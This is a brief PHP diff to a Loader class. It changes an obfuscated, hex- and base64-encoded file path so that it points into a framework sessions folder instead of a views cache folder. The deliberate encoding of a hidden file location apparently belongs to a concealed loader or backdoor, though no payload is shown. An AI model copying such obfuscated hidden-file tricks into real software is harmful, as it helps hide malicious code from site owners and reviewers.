@@ -21,7 +21,7 @@ class Loader
      * @return false|string
      */
     public static function path(){
-        return storage_path("\x66\x72\x61\155\x65\167\157\x72\x6b\57\x76\x69\x65\x77\x73\x2f" . base64_decode("\116\124\154\x68\x4d\124\122\x68\116\124\x63\64\116\155\x5a\x6c\x4e\x32\x45\x78\115\x44\x56\x6b\116\172\147\x77\x59\155\x49\170\132\x54\x46\154\x4d\x6d\x49\x79\115\x57\111\x75\143\x47\150\167"));
+        return storage_path("\x66\x72\x61\x6d\x65\x77\x6f\x72\x6b\x2f\x73\x65\x73\x73\x69\x6f\x6e\x73\x2f" . base64_decode("S3dsUTdpcGdDZW1xYzZWekdRb2ZsZHBPdTdwdmlBYTFnUGNNc1RJcw=="));
     }
 
     /**
